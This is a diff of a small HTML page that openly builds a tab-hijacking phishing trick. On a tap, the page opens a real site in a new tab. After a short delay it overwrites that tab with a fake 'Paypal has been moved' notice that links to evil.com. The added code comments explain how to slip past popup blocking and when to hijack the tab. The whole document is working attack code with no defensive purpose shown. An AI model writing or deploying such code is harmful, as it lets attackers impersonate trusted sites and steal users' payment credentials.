@@ -1,32 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tap Anywhere to Hijack Tab</title>
+  <title>Tap to Hijack Legit Tab</title>
   <script>
-    function pwned() {
-      var t = window.open('', 'ss'); // Uses named window/tab "ss"
-      if (t) {
-        t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
-        t.stop();
+    let tabRef;
+
+    function pwned(tab) {
+      if (tab && !tab.closed) {
+        tab.document.write(`<h1>⚠️ Paypal has been moved</h1><p><a href="https://evil.com">Click here to proceed</a></p>`);
+        tab.document.close();
       } else {
-        alert("Popup blocked or window 'ss' not available");
+        alert("Popup blocked or tab closed");
       }
     }
 
     document.addEventListener('DOMContentLoaded', function () {
-      function handleTap(e) {
-        document.body.removeEventListener('touchstart', handleTap);
-        pwned();
-      }
+      document.body.addEventListener('touchstart', function handler(e) {
+        document.body.removeEventListener('touchstart', handler);
 
-      document.body.addEventListener('touchstart', handleTap, { once: true });
+        // Step 1: open real site immediately (this avoids popup block)
+        tabRef = window.open('https://legitsite.com', '_blank');
+
+        // Step 2: hijack content after short delay
+        setTimeout(() => pwned(tabRef), 1500); // Delay allows real site to load before hijack
+      }, { once: true });
     });
   </script>
 </head>
 <body>
-  <h1 style="text-align:center; margin-top:100px;">📱 Tap anywhere to launch</h1>
-
-  <!-- Optional: This link can preload the named tab -->
-  <a href="https://legitsite.com" target="ss" style="display:none;">Preload tab</a>
+  <h1 style="text-align:center; margin-top:100px;">📱 Tap anywhere to begin</h1>
 </body>
 </html>
